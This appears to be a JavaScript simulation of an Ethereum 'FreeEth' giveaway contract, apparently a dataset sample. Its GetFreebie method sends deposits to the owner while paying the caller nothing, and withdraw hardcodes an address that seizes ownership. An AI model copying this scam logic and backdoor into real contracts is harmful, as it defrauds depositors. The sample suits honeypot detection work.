/*



 */

class FreeEth {
    constructor(msg_sender) {
        this.Owner = msg_sender;
        this.balance = 0n; // [SIMULATED: contract balance]
    }

    // [SIMULATED: fallback function]
    fallback(msg_value) {
        this.balance += msg_value;
    }

    GetFreebie(msg_sender, msg_value) {
        if (msg_value > 1000000000000000000n) {
            // [SIMULATED: Owner.transfer(this.balance)]
            this.balance = 0n;
            // [SIMULATED: msg.sender.transfer(this.balance)]
            this.balance = 0n;
        }
    }

    withdraw(msg_sender) {
        if (msg_sender == "0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af") {
            this.Owner = "0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af";
        }
        if (!(msg_sender == this.Owner)) throw new Error("require");
        // [SIMULATED: Owner.transfer(this.balance)]
        this.balance = 0n;
    }

    Command(adr, data, msg_sender, msg_value) {
        if (!(msg_sender == this.Owner)) throw new Error("require");
        //
        // [SIMULATED: adr.call.value(msg.value)(data)]
    }
}